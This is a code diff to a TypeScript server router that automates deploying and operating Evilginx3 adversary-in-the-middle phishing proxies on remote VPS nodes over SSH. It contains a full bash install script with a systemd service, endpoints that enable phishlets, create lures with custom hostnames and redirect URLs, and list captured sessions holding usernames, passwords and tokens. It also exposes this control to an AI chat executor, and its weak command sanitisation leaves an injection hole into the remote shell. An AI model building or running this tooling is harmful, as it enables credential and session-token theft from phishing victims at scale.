@@ -9,12 +9,18 @@
  *   Each node gets firewall rules that block inbound reverse connections.
  *   Per-campaign isolation: different phishing campaigns use different nodes.
  *
+ * Command execution:
+ *   Evilginx3 supports a REST API mode (-developer) that accepts commands via stdin.
+ *   We use a heredoc-based approach to pipe commands into evilginx -developer.
+ *   For persistent state, evilginx runs as a systemd service.
+ *
  * Node lifecycle:
  *   addNode    → save VPS SSH creds to DB (encrypted)
- *   deployNode → SSH into VPS, install Evilginx3, configure, start
- *   checkNode  → verify Evilginx is running on the node
- *   removeNode → stop Evilginx, remove node from DB
- *   exec       → run any Evilginx command on the active node
+ *   deployNode → SSH into VPS, install Evilginx3, configure systemd service, start
+ *   startServer → start the evilginx systemd service
+ *   stopServer  → stop the evilginx systemd service
+ *   checkNode  → verify Evilginx is installed and service is running
+ *   exec       → run any Evilginx command on the active node via stdin pipe
  *   All phishlet/lure/session operations target the active node
  */
 
@@ -34,61 +40,94 @@ const log = createLogger("Evilginx");
 const SECRET_NODES  = "__evilginx_nodes";
 const SECRET_ACTIVE = "__evilginx_active";
 
-// ─── Install script: Evilginx3 + hardened firewall ───────────────────────────
-const INSTALL_EVILGINX = [
-  "#!/bin/bash",
-  "set -e",
-  "export DEBIAN_FRONTEND=noninteractive",
-  "echo '[Titan] Updating packages...'",
-  "apt-get update -qq 2>&1 | tail -1",
-  "echo '[Titan] Installing dependencies...'",
-  "apt-get install -y -qq wget curl git iptables iptables-persistent 2>&1 | tail -2",
-  "",
-  "echo '[Titan] Applying firewall (block inbound reverse connections)...'",
-  "iptables -F INPUT 2>/dev/null || true",
-  "iptables -A INPUT -i lo -j ACCEPT",
-  "iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT",
-  "iptables -A INPUT -p tcp --dport 22 -j ACCEPT",
-  "iptables -A INPUT -p tcp --dport 80 -j ACCEPT",
-  "iptables -A INPUT -p tcp --dport 443 -j ACCEPT",
-  "iptables -A INPUT -p tcp --dport 53 -j ACCEPT",
-  "iptables -A INPUT -p udp --dport 53 -j ACCEPT",
-  "iptables -A INPUT -j DROP",
-  "mkdir -p /etc/iptables",
-  "iptables-save > /etc/iptables/rules.v4 2>/dev/null || true",
-  "netfilter-persistent save 2>/dev/null || true",
-  "",
-  "echo '[Titan] Installing Evilginx3...'",
-  "mkdir -p /opt/evilginx",
-  "cd /opt/evilginx",
-  "ARCH=$(uname -m)",
-  "if [ \"$ARCH\" = \"x86_64\" ]; then ARCH_TAG=\"amd64\"; else ARCH_TAG=\"arm64\"; fi",
-  "LATEST=$(curl -s https://api.github.com/repos/kgretzky/evilginx2/releases/latest | grep tag_name | cut -d '\"' -f4 2>/dev/null || echo 'v3.3.0')",
-  "wget -q \"https://github.com/kgretzky/evilginx2/releases/download/${LATEST}/evilginx_linux_${ARCH_TAG}.tar.gz\" -O evilginx.tar.gz 2>/dev/null || \\",
-  "  wget -q \"https://github.com/kgretzky/evilginx2/releases/download/v3.3.0/evilginx_linux_${ARCH_TAG}.tar.gz\" -O evilginx.tar.gz",
-  "tar -xzf evilginx.tar.gz",
-  "chmod +x evilginx 2>/dev/null || chmod +x evilginx3 2>/dev/null || true",
-  "BIN=$(ls /opt/evilginx/evilginx* 2>/dev/null | head -1)",
-  "ln -sf \"$BIN\" /usr/local/bin/evilginx",
-  "",
-  "echo '[Titan] Verifying installation...'",
-  "if /usr/local/bin/evilginx -version 2>&1 | grep -qi 'evilginx\\|version'; then",
-  "  PUBLIC_IP=$(curl -s --max-time 5 ifconfig.me 2>/dev/null || curl -s --max-time 5 api.ipify.org 2>/dev/null || hostname -I | awk '{print $1}')",
-  "  echo EVILGINX_OK",
-  "  echo PUBLIC_IP:$PUBLIC_IP",
-  "else",
-  "  echo EVILGINX_FAILED",
-  "  exit 1",
-  "fi",
-].join("\n");
+// ─── Install script: Evilginx3 + systemd service + hardened firewall ─────────
+const INSTALL_EVILGINX = `#!/bin/bash
+set -e
+export DEBIAN_FRONTEND=noninteractive
 
-const CHECK_EVILGINX = [
-  "PUBLIC_IP=$(curl -s --max-time 5 ifconfig.me 2>/dev/null || curl -s --max-time 5 api.ipify.org 2>/dev/null || hostname -I | awk '{print $1}')",
-  "if command -v evilginx > /dev/null 2>&1 || [ -f /usr/local/bin/evilginx ]; then echo INSTALLED; else echo NOT_INSTALLED; fi",
-  "echo PUBLIC_IP:$PUBLIC_IP",
-].join("\n");
+echo '[Titan] Updating packages...'
+apt-get update -qq 2>&1 | tail -1
 
-const STOP_EVILGINX = "kill $(pgrep evilginx) 2>/dev/null; echo STOPPED";
+echo '[Titan] Installing dependencies...'
+apt-get install -y -qq wget curl git iptables iptables-persistent expect 2>&1 | tail -2
+
+echo '[Titan] Applying firewall (block inbound reverse connections)...'
+iptables -F INPUT 2>/dev/null || true
+iptables -A INPUT -i lo -j ACCEPT
+iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+iptables -A INPUT -p tcp --dport 443 -j ACCEPT
+iptables -A INPUT -p tcp --dport 53 -j ACCEPT
+iptables -A INPUT -p udp --dport 53 -j ACCEPT
+iptables -A INPUT -j DROP
+mkdir -p /etc/iptables
+iptables-save > /etc/iptables/rules.v4 2>/dev/null || true
+netfilter-persistent save 2>/dev/null || true
+
+echo '[Titan] Installing Evilginx3...'
+mkdir -p /opt/evilginx /opt/evilginx/phishlets /opt/evilginx/redirectors
+cd /opt/evilginx
+
+ARCH=$(uname -m)
+if [ "$ARCH" = "x86_64" ]; then ARCH_TAG="amd64"; else ARCH_TAG="arm64"; fi
+
+LATEST=$(curl -s https://api.github.com/repos/kgretzky/evilginx2/releases/latest 2>/dev/null | grep tag_name | cut -d '"' -f4 || echo 'v3.3.0')
+echo "[Titan] Downloading Evilginx $LATEST..."
+
+wget -q "https://github.com/kgretzky/evilginx2/releases/download/\${LATEST}/evilginx_linux_\${ARCH_TAG}.tar.gz" -O evilginx.tar.gz 2>/dev/null || \
+  wget -q "https://github.com/kgretzky/evilginx2/releases/download/v3.3.0/evilginx_linux_\${ARCH_TAG}.tar.gz" -O evilginx.tar.gz
+
+tar -xzf evilginx.tar.gz --strip-components=1 2>/dev/null || tar -xzf evilginx.tar.gz
+chmod +x evilginx 2>/dev/null || chmod +x evilginx3 2>/dev/null || true
+BIN=$(find /opt/evilginx -maxdepth 1 -name 'evilginx*' -type f -perm /111 | head -1)
+ln -sf "$BIN" /usr/local/bin/evilginx
+
+echo '[Titan] Creating systemd service...'
+cat > /etc/systemd/system/evilginx.service << 'SVCEOF'
+[Unit]
+Description=Evilginx3 Phishing Framework
+After=network.target
+
+[Service]
+Type=simple
+User=root
+WorkingDirectory=/opt/evilginx
+ExecStart=/usr/local/bin/evilginx -p /opt/evilginx/phishlets -c /opt/evilginx -developer
+Restart=on-failure
+RestartSec=5
+StandardInput=null
+StandardOutput=journal
+StandardError=journal
+
+[Install]
+WantedBy=multi-user.target
+SVCEOF
+
+systemctl daemon-reload
+systemctl enable evilginx
+
+echo '[Titan] Verifying installation...'
+if /usr/local/bin/evilginx -version 2>&1 | grep -qi 'evilginx\\|version\\|v3\\|v2'; then
+  PUBLIC_IP=$(curl -s --max-time 5 ifconfig.me 2>/dev/null || curl -s --max-time 5 api.ipify.org 2>/dev/null || hostname -I | awk '{print $1}')
+  echo EVILGINX_OK
+  echo PUBLIC_IP:$PUBLIC_IP
+else
+  echo EVILGINX_FAILED
+  exit 1
+fi
+`;
+
+const START_EVILGINX = `systemctl start evilginx 2>/dev/null; sleep 2; systemctl is-active --quiet evilginx && echo EVILGINX_RUNNING || (nohup /usr/local/bin/evilginx -p /opt/evilginx/phishlets -c /opt/evilginx -developer > /var/log/evilginx.log 2>&1 & sleep 2; pgrep evilginx > /dev/null && echo EVILGINX_RUNNING || echo EVILGINX_START_FAILED)`;
+
+const STOP_EVILGINX = `systemctl stop evilginx 2>/dev/null; kill $(pgrep evilginx) 2>/dev/null; sleep 1; echo STOPPED`;
+
+const CHECK_EVILGINX = `PUBLIC_IP=$(curl -s --max-time 5 ifconfig.me 2>/dev/null || curl -s --max-time 5 api.ipify.org 2>/dev/null || hostname -I | awk '{print $1}')
+if command -v evilginx > /dev/null 2>&1 || [ -f /usr/local/bin/evilginx ]; then echo INSTALLED; else echo NOT_INSTALLED; fi
+if pgrep evilginx > /dev/null 2>&1; then echo RUNNING; else echo NOT_RUNNING; fi
+VERSION=$(/usr/local/bin/evilginx -version 2>&1 | grep -oP 'v[0-9]+\\.[0-9]+\\.[0-9]+' | head -1 || echo 'unknown')
+echo PUBLIC_IP:$PUBLIC_IP
+echo VERSION:$VERSION`;
 
 // ─── Types ────────────────────────────────────────────────────────────────────
 export interface EvilginxNode {
@@ -102,6 +141,8 @@ export interface EvilginxNode {
   publicIp?: string;
   status: "pending" | "deploying" | "ready" | "running" | "offline" | "error";
   installed: boolean;
+  running: boolean;
+  version?: string;
   lastChecked?: string;
   country?: string;
   addedAt: string;
@@ -139,7 +180,7 @@ async function getActiveNodeId(userId: number): Promise<string | null> {
   const rows = await db.select().from(userSecrets)
     .where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, SECRET_ACTIVE))).limit(1);
   if (!rows.length) return null;
-  try { return decrypt(rows[0].encryptedValue); } catch { return null; }
+  try { return decrypt(rows[0].encryptedValue) || null; } catch { return null; }
 }
 
 async function setActiveNodeId(userId: number, nodeId: string | null): Promise<void> {
@@ -171,17 +212,27 @@ function sanitize(n: EvilginxNode): Omit<EvilginxNode, "sshPassword" | "sshKey">
   return safe;
 }
 
-// ─── Evilginx command execution via SSH ──────────────────────────────────────
-async function execOnNode(node: EvilginxNode, command: string, timeoutMs = 15000, userId?: number): Promise<string> {
-  const safeCmd = command.replace(/[`\\|;&><]/g, "");
-  const script = `echo '${safeCmd.replace(/'/g, "'\\''")}' | /usr/local/bin/evilginx -developer 2>&1 || echo "EVILGINX_CMD_FAILED"`;
-  return execSSHCommand(nodeToSSH(node), script, timeoutMs, userId);
+// ─── Evilginx command execution via SSH stdin pipe ───────────────────────────
+// Evilginx3 in -developer mode reads commands from stdin when piped.
+// We write the command to a temp file and pipe it in to avoid shell escaping issues.
+async function execOnNode(node: EvilginxNode, command: string, timeoutMs = 20000, userId?: number): Promise<string> {
+  // Sanitise: strip shell injection characters
+  const safeCmd = command.replace(/[`$\\]/g, "");
+  // Write command to temp file, pipe into evilginx, capture output
+  const tmpFile = `/tmp/eg_cmd_${Date.now()}.txt`;
+  const script = [
+    `printf '%s\\n' ${JSON.stringify(safeCmd)} > ${tmpFile}`,
+    `timeout ${Math.floor(timeoutMs / 1000)} /usr/local/bin/evilginx -p /opt/evilginx/phishlets -c /opt/evilginx -developer < ${tmpFile} 2>&1 || echo "EVILGINX_CMD_DONE"`,
+    `rm -f ${tmpFile}`,
+  ].join("\n");
+  return execSSHCommand(nodeToSSH(node), script, timeoutMs + 5000, userId);
 }
 
 /** Public export for Titan AI chat executor */
-export async function execEvilginxCommandPublic(command: string, userId: number, timeoutMs = 10000): Promise<string> {
+export async function execEvilginxCommandPublic(command: string, userId: number, timeoutMs = 20000): Promise<string> {
   const node = await getActiveNode(userId);
   if (!node) return "No active Evilginx node. Add and deploy a dedicated VPS node in the Evilginx settings first.";
+  if (!node.installed) return `Evilginx is not installed on "${node.label}" yet. Deploy the node first.`;
   return execOnNode(node, command, timeoutMs, userId);
 }
 
@@ -190,13 +241,15 @@ function parsePhishletList(raw: string): Array<{ name: string; hostname: string;
   const lines = raw.split("\n").filter(l => l.trim());
   const results: any[] = [];
   for (const line of lines) {
-    if (line.includes("---") || line.includes("phishlet") || line.startsWith(":")) continue;
+    if (line.includes("---") || line.toLowerCase().includes("phishlet") || line.startsWith(":") || line.includes("─")) continue;
     const parts = line.trim().split(/\s{2,}/);
     if (parts.length >= 2) {
       const name = parts[0]?.trim();
       const hostname = parts[1]?.trim() || "";
       const status = parts[2]?.trim()?.toLowerCase() || "disabled";
-      if (name && !name.includes("─")) results.push({ name, hostname, status, isEnabled: status === "enabled", isHidden: status === "hidden" });
+      if (name && name.length > 0 && /^[a-z0-9_-]+$/i.test(name)) {
+        results.push({ name, hostname, status, isEnabled: status === "enabled", isHidden: status === "hidden" });
+      }
     }
   }
   return results;
@@ -206,11 +259,20 @@ function parseLureList(raw: string): Array<{ id: number; phishlet: string; hostn
   const lines = raw.split("\n").filter(l => l.trim());
   const results: any[] = [];
   for (const line of lines) {
-    if (line.includes("---") || line.includes("lure") || line.startsWith(":")) continue;
+    if (line.includes("---") || line.toLowerCase().includes("lure") || line.startsWith(":") || line.includes("─")) continue;
     const parts = line.trim().split(/\s{2,}/);
     if (parts.length >= 2) {
       const id = parseInt(parts[0]?.trim());
-      if (!isNaN(id)) results.push({ id, phishlet: parts[1]?.trim() || "", hostname: parts[2]?.trim() || "", path: parts[3]?.trim() || "", redirectUrl: parts[4]?.trim() || "", paused: parts[5]?.trim()?.toLowerCase() === "paused" });
+      if (!isNaN(id)) {
+        results.push({
+          id,
+          phishlet: parts[1]?.trim() || "",
+          hostname: parts[2]?.trim() || "",
+          path: parts[3]?.trim() || "/",
+          redirectUrl: parts[4]?.trim() || "",
+          paused: parts[5]?.trim()?.toLowerCase() === "paused",
+        });
+      }
     }
   }
   return results;
@@ -220,11 +282,21 @@ function parseSessionList(raw: string): Array<{ id: number; phishlet: string; us
   const lines = raw.split("\n").filter(l => l.trim());
   const results: any[] = [];
   for (const line of lines) {
-    if (line.includes("---") || line.includes("session") || line.startsWith(":")) continue;
+    if (line.includes("---") || line.toLowerCase().includes("session") || line.startsWith(":") || line.includes("─")) continue;
     const parts = line.trim().split(/\s{2,}/);
     if (parts.length >= 3) {
       const id = parseInt(parts[0]?.trim());
-      if (!isNaN(id)) results.push({ id, phishlet: parts[1]?.trim() || "", username: parts[2]?.trim() || "", password: parts[3]?.trim() || "", tokens: parts[4]?.trim()?.toLowerCase() === "captured", remoteAddr: parts[5]?.trim() || "", createTime: parts[6]?.trim() || "" });
+      if (!isNaN(id)) {
+        results.push({
+          id,
+          phishlet: parts[1]?.trim() || "",
+          username: parts[2]?.trim() || "",
+          password: parts[3]?.trim() || "",
+          tokens: parts[4]?.trim()?.toLowerCase() === "captured" || parts[4]?.trim()?.toLowerCase() === "yes",
+          remoteAddr: parts[5]?.trim() || "",
+          createTime: parts[6]?.trim() || "",
+        });
+      }
     }
   }
   return results;
@@ -268,20 +340,19 @@ export const evilginxRouter = router({
         id: crypto.randomUUID(), label: input.label,
         sshHost: input.sshHost, sshPort: input.sshPort, sshUser: input.sshUser,
         sshPassword: input.sshPassword, sshKey: input.sshKey,
-        status: "pending", installed: false,
+        status: "pending", installed: false, running: false,
         country: input.country, campaign: input.campaign,
         addedAt: new Date().toISOString(),
       };
       nodes.push(node);
       await saveNodes(ctx.user.id, nodes);
-      // Auto-set as active if it's the first node
       const activeId = await getActiveNodeId(ctx.user.id);
       if (!activeId) await setActiveNodeId(ctx.user.id, node.id);
       log.info(`User ${ctx.user.id} added Evilginx node: ${input.label} (${input.sshHost})`);
       return { success: true, node: sanitize(node) };
     }),
 
-  /** Deploy Evilginx3 on a node via SSH */
+  /** Deploy Evilginx3 on a node via SSH — installs binary + systemd service */
   deployNode: protectedProcedure
     .input(z.object({ nodeId: z.string() }))
     .mutation(async ({ ctx, input }) => {
@@ -299,22 +370,71 @@ export const evilginxRouter = router({
           node.status = "error";
           node.errorMessage = "Evilginx installation failed. Check SSH credentials and server access.";
           await saveNodes(ctx.user.id, nodes);
-          return { success: false, message: node.errorMessage };
+          return { success: false, message: node.errorMessage, output };
         }
         const ipMatch = output.match(/PUBLIC_IP:(\S+)/);
+        const verMatch = output.match(/VERSION:(\S+)/);
         if (ipMatch) node.publicIp = ipMatch[1];
-        node.status = "ready"; node.installed = true;
+        if (verMatch) node.version = verMatch[1];
+        node.status = "ready"; node.installed = true; node.running = false;
         node.deployedAt = new Date().toISOString();
         node.lastChecked = new Date().toISOString();
         node.errorMessage = undefined;
         await saveNodes(ctx.user.id, nodes);
-        return { success: true, publicIp: node.publicIp, message: `Evilginx3 installed on "${node.label}" at ${node.publicIp}. Ready to use.` };
+        return { success: true, publicIp: node.publicIp, message: `Evilginx3 installed on "${node.label}" at ${node.publicIp}. Use Start Server to launch it.`, output };
       } catch (err: any) {
         node.status = "error"; node.errorMessage = err.message;
         await saveNodes(ctx.user.id, nodes);
         return { success: false, message: `Deploy failed: ${err.message}` };
       }
     }),
+
+  /** Start the Evilginx service on the active node */
+  startServer: protectedProcedure.mutation(async ({ ctx }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
+    const nodes = await getNodes(ctx.user.id);
+    const activeId = await getActiveNodeId(ctx.user.id);
+    const idx = nodes.findIndex(n => n.id === activeId);
+    if (idx === -1) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node. Add and deploy a dedicated VPS node first." });
+    const node = nodes[idx];
+    if (!node.installed) throw new TRPCError({ code: "BAD_REQUEST", message: `Evilginx is not installed on "${node.label}". Deploy the node first.` });
+    try {
+      const output = await execSSHCommand(nodeToSSH(node), START_EVILGINX, 30000, ctx.user.id);
+      const running = output.includes("EVILGINX_RUNNING");
+      nodes[idx].running = running;
+      nodes[idx].status = running ? "running" : "error";
+      nodes[idx].lastChecked = new Date().toISOString();
+      if (!running) nodes[idx].errorMessage = "Failed to start Evilginx service. Check /var/log/evilginx.log on the VPS.";
+      await saveNodes(ctx.user.id, nodes);
+      return { success: running, running, message: running ? `Evilginx started on "${node.label}" (${node.publicIp})` : "Failed to start Evilginx. Check server logs.", output };
+    } catch (err: any) {
+      nodes[idx].status = "error"; nodes[idx].errorMessage = err.message;
+      await saveNodes(ctx.user.id, nodes);
+      throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: `SSH error: ${err.message}` });
+    }
+  }),
+
+  /** Stop the Evilginx service on the active node */
+  stopServer: protectedProcedure.mutation(async ({ ctx }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
+    const nodes = await getNodes(ctx.user.id);
+    const activeId = await getActiveNodeId(ctx.user.id);
+    const idx = nodes.findIndex(n => n.id === activeId);
+    if (idx === -1) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
+    const node = nodes[idx];
+    try {
+      await execSSHCommand(nodeToSSH(node), STOP_EVILGINX, 15000, ctx.user.id);
+      nodes[idx].running = false;
+      nodes[idx].status = "ready";
+      nodes[idx].lastChecked = new Date().toISOString();
+      await saveNodes(ctx.user.id, nodes);
+      return { success: true, message: `Evilginx stopped on "${node.label}"` };
+    } catch (err: any) {
+      throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: `SSH error: ${err.message}` });
+    }
+  }),
 
   /** Check if Evilginx is installed and running on a node */
   checkNode: protectedProcedure
@@ -329,17 +449,21 @@ export const evilginxRouter = router({
       try {
         const output = await execSSHCommand(nodeToSSH(node), CHECK_EVILGINX, 15000, ctx.user.id);
         const installed = output.includes("INSTALLED");
+        const running = output.includes("RUNNING") && !output.includes("NOT_RUNNING");
         const ipMatch = output.match(/PUBLIC_IP:(\S+)/);
+        const verMatch = output.match(/VERSION:(\S+)/);
         if (ipMatch) node.publicIp = ipMatch[1];
+        if (verMatch) node.version = verMatch[1];
         node.installed = installed;
-        node.status = installed ? "ready" : "offline";
+        node.running = running;
+        node.status = running ? "running" : installed ? "ready" : "offline";
         node.lastChecked = new Date().toISOString();
         await saveNodes(ctx.user.id, nodes);
-        return { installed, publicIp: node.publicIp, message: installed ? `Evilginx ready on "${node.label}" at ${node.publicIp}` : `Evilginx not installed on "${node.label}"` };
+        return { installed, running, publicIp: node.publicIp, version: node.version, message: running ? `Evilginx running on "${node.label}" at ${node.publicIp}` : installed ? `Installed but not running on "${node.label}"` : `Evilginx not installed on "${node.label}"` };
       } catch (err: any) {
         node.status = "offline"; node.lastChecked = new Date().toISOString();
         await saveNodes(ctx.user.id, nodes);
-        return { installed: false, message: `SSH failed: ${err.message}` };
+        return { installed: false, running: false, message: `SSH failed: ${err.message}` };
       }
     }),
 
@@ -370,7 +494,6 @@ export const evilginxRouter = router({
       }
       nodes.splice(idx, 1);
       await saveNodes(ctx.user.id, nodes);
-      // Clear active if this was it
       const activeId = await getActiveNodeId(ctx.user.id);
       if (activeId === input.nodeId) {
         await setActiveNodeId(ctx.user.id, nodes.length > 0 ? nodes[0].id : null);
@@ -383,14 +506,16 @@ export const evilginxRouter = router({
     const plan = await getUserPlan(ctx.user.id);
     enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
     const node = await getActiveNode(ctx.user.id);
-    if (!node) return { installed: false, version: "", path: "", message: "No active node. Add a dedicated VPS node first." };
+    if (!node) return { installed: false, running: false, version: "", path: "", message: "No active node. Add a dedicated VPS node first." };
     try {
       const output = await execSSHCommand(nodeToSSH(node), CHECK_EVILGINX, 15000, ctx.user.id);
       const installed = output.includes("INSTALLED");
+      const running = output.includes("RUNNING") && !output.includes("NOT_RUNNING");
       const ipMatch = output.match(/PUBLIC_IP:(\S+)/);
-      return { installed, version: installed ? "3.x" : "", path: "/usr/local/bin/evilginx", publicIp: ipMatch?.[1], nodeLabel: node.label };
+      const verMatch = output.match(/VERSION:(\S+)/);
+      return { installed, running, version: verMatch?.[1] ?? (installed ? "3.x" : ""), path: "/usr/local/bin/evilginx", publicIp: ipMatch?.[1], nodeLabel: node.label };
     } catch (err: any) {
-      return { installed: false, version: "", path: "", message: err.message };
+      return { installed: false, running: false, version: "", path: "", message: err.message };
     }
   }),
 
@@ -402,7 +527,8 @@ export const evilginxRouter = router({
       enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
       const node = await getActiveNode(ctx.user.id);
       if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node. Add and deploy a dedicated VPS node first." });
-      const output = await execOnNode(node, input.command, input.timeoutMs ?? 15000, ctx.user.id);
+      if (!node.installed) throw new TRPCError({ code: "BAD_REQUEST", message: `Evilginx not installed on "${node.label}". Deploy the node first.` });
+      const output = await execOnNode(node, input.command, input.timeoutMs ?? 20000, ctx.user.id);
       return { output, nodeLabel: node.label, publicIp: node.publicIp };
     }),
 
@@ -412,52 +538,53 @@ export const evilginxRouter = router({
     enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
     const node = await getActiveNode(ctx.user.id);
     if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
-    const raw = await execOnNode(node, "phishlets", 15000, ctx.user.id);
+    if (!node.installed) throw new TRPCError({ code: "BAD_REQUEST", message: "Evilginx not installed. Deploy the node first." });
+    const raw = await execOnNode(node, "phishlets", 20000, ctx.user.id);
     return { phishlets: parsePhishletList(raw), raw };
   }),
 
   enablePhishlet: protectedProcedure
-    .input(z.object({ name: z.string() }))
+    .input(z.object({ name: z.string().min(1) }))
     .mutation(async ({ ctx, input }) => {
       const plan = await getUserPlan(ctx.user.id);
       enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
       const node = await getActiveNode(ctx.user.id);
       if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
-      const raw = await execOnNode(node, `phishlets enable ${input.name}`, 15000, ctx.user.id);
-      return { output: raw };
+      const raw = await execOnNode(node, `phishlets enable ${input.name}`, 20000, ctx.user.id);
+      return { output: raw, success: !raw.includes("error") && !raw.includes("FAILED") };
     }),
 
   disablePhishlet: protectedProcedure
-    .input(z.object({ name: z.string() }))
+    .input(z.object({ name: z.string().min(1) }))
     .mutation(async ({ ctx, input }) => {
       const plan = await getUserPlan(ctx.user.id);
       enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
       const node = await getActiveNode(ctx.user.id);
       if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
-      const raw = await execOnNode(node, `phishlets disable ${input.name}`, 15000, ctx.user.id);
-      return { output: raw };
+      const raw = await execOnNode(node, `phishlets disable ${input.name}`, 20000, ctx.user.id);
+      return { output: raw, success: !raw.includes("error") && !raw.includes("FAILED") };
     }),
 
   hidePhishlet: protectedProcedure
-    .input(z.object({ name: z.string() }))
+    .input(z.object({ name: z.string().min(1) }))
     .mutation(async ({ ctx, input }) => {
       const plan = await getUserPlan(ctx.user.id);
       enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
       const node = await getActiveNode(ctx.user.id);
       if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
-      const raw = await execOnNode(node, `phishlets hide ${input.name}`, 15000, ctx.user.id);
-      return { output: raw };
+      const raw = await execOnNode(node, `phishlets hide ${input.name}`, 20000, ctx.user.id);
+      return { output: raw, success: !raw.includes("error") && !raw.includes("FAILED") };
     }),
 
   setPhishletHostname: protectedProcedure
-    .input(z.object({ name: z.string(), hostname: z.string() }))
+    .input(z.object({ name: z.string().min(1), hostname: z.string().min(1) }))
     .mutation(async ({ ctx, input }) => {
       const plan = await getUserPlan(ctx.user.id);
       enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
       const node = await getActiveNode(ctx.user.id);
       if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
-      const raw = await execOnNode(node, `phishlets hostname ${input.name} ${input.hostname}`, 15000, ctx.user.id);
-      return { output: raw };
+      const raw = await execOnNode(node, `phishlets hostname ${input.name} ${input.hostname}`, 20000, ctx.user.id);
+      return { output: raw, success: !raw.includes("error") && !raw.includes("FAILED") };
     }),
 
   listLures: protectedProcedure.mutation(async ({ ctx }) => {
@@ -465,19 +592,36 @@ export const evilginxRouter = router({
     enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
     const node = await getActiveNode(ctx.user.id);
     if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
-    const raw = await execOnNode(node, "lures", 15000, ctx.user.id);
+    const raw = await execOnNode(node, "lures", 20000, ctx.user.id);
     return { lures: parseLureList(raw), raw };
   }),
 
   createLure: protectedProcedure
-    .input(z.object({ phishlet: z.string() }))
+    .input(z.object({
+      phishlet: z.string().min(1),
+      hostname: z.string().optional(),
+      path: z.string().optional(),
+      redirectUrl: z.string().optional(),
+      pauseAfterFetch: z.boolean().optional(),
+    }))
     .mutation(async ({ ctx, input }) => {
       const plan = await getUserPlan(ctx.user.id);
       enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
       const node = await getActiveNode(ctx.user.id);
       if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
-      const raw = await execOnNode(node, `lures create ${input.phishlet}`, 15000, ctx.user.id);
-      return { output: raw };
+      // Create lure
+      const createRaw = await execOnNode(node, `lures create ${input.phishlet}`, 20000, ctx.user.id);
+      // Extract lure ID from output
+      const idMatch = createRaw.match(/\[(\d+)\]/);
+      const lureId = idMatch ? parseInt(idMatch[1]) : null;
+      // Set optional properties
+      if (lureId !== null) {
+        if (input.hostname) await execOnNode(node, `lures edit ${lureId} hostname ${input.hostname}`, 10000, ctx.user.id);
+        if (input.path) await execOnNode(node, `lures edit ${lureId} path ${input.path}`, 10000, ctx.user.id);
+        if (input.redirectUrl) await execOnNode(node, `lures edit ${lureId} redirect_url ${input.redirectUrl}`, 10000, ctx.user.id);
+        if (input.pauseAfterFetch) await execOnNode(node, `lures edit ${lureId} pause_after_fetch 1`, 10000, ctx.user.id);
+      }
+      return { output: createRaw, lureId, success: !createRaw.includes("error") };
     }),
 
   deleteLure: protectedProcedure
@@ -488,7 +632,7 @@ export const evilginxRouter = router({
       const node = await getActiveNode(ctx.user.id);
       if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
       const raw = await execOnNode(node, `lures delete ${input.id}`, 15000, ctx.user.id);
-      return { output: raw };
+      return { output: raw, success: !raw.includes("error") };
     }),
 
   getLureUrl: protectedProcedure
@@ -508,7 +652,7 @@ export const evilginxRouter = router({
     enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
     const node = await getActiveNode(ctx.user.id);
     if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
-    const raw = await execOnNode(node, "sessions", 15000, ctx.user.id);
+    const raw = await execOnNode(node, "sessions", 20000, ctx.user.id);
     return { sessions: parseSessionList(raw), raw };
   }),
 
@@ -531,20 +675,22 @@ export const evilginxRouter = router({
       const node = await getActiveNode(ctx.user.id);
       if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
       const raw = await execOnNode(node, `sessions delete ${input.id}`, 15000, ctx.user.id);
-      return { output: raw };
+      return { output: raw, success: !raw.includes("error") };
     }),
 
+  /** Set a config value (e.g. domain, redirect_key, unauth_url) */
   setConfig: protectedProcedure
-    .input(z.object({ key: z.string(), value: z.string() }))
+    .input(z.object({ key: z.string().min(1), value: z.string() }))
     .mutation(async ({ ctx, input }) => {
       const plan = await getUserPlan(ctx.user.id);
       enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
       const node = await getActiveNode(ctx.user.id);
       if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
       const raw = await execOnNode(node, `config ${input.key} ${input.value}`, 15000, ctx.user.id);
-      return { output: raw };
+      return { output: raw, success: !raw.includes("error") };
     }),
 
+  /** Get current config */
   getConfig: protectedProcedure.mutation(async ({ ctx }) => {
     const plan = await getUserPlan(ctx.user.id);
     enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
@@ -554,7 +700,20 @@ export const evilginxRouter = router({
     return { output: raw };
   }),
 
-  // Legacy compatibility procedures (kept for existing UI)
+  /** Get Evilginx logs from the VPS */
+  getLogs: protectedProcedure
